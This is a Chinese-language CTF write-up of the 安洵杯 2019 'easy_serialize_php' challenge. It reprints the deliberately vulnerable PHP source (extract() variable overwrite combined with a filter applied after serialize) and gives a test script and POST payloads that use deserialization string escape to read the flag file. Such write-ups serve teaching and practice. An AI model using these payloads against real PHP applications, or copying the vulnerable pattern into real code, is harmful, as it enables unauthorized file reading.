# 原创
：  [安洵杯 2019]easy_serialize_php

# [安洵杯 2019]easy_serialize_php

#### [安洵杯 2019]easy_serialize_php

## 考点

> 
extract()变量覆盖、PHP反序列化字符串逃逸


## 思路

> 
首先分析题目直接给的源码<br/> 题目告诉我们当参数f=phpinfo时，可以通过phpinfo得到一些有用的东西，即flag文件的名字d0g3_f1ag.php<br/> 我们可以看见最关键的就是img，所以我们需要控制这个img<br/> 可以看见有个extract($_POST);，可以实现变量覆盖，所以我们可以构造一个新的session值<br/> 结合filter函数实现字符串逃逸，来实现d0g3_f1ag.php


```
// 源码
&lt;?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}

```

## Payload

```
// 测试payload
&lt;?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION['flagphp']=';s:3:"333";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialize_info = filter(serialize($_SESSION));
echo $serialize_info."\n";
var_dump(unserialize($serialize_info));
$b = unserialize($serialize_info);
echo $b['img'];
?&gt;

a:2:{s:7:"";s:50:";s:3:"333";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
array(2) {
  ["";s:50:"]=&gt;
  string(3) "333"
  ["img"]=&gt;
  string(20) "ZDBnM19mMWFnLnBocA=="
}
ZDBnM19mMWFnLnBocA==

```

> 
第一次传参：<br/> get：`f=show_image`<br/> post：`_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`


> 
第二次传参：<br/> get：`f=show_image`<br/> post：`_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}`<br/> 得到flag

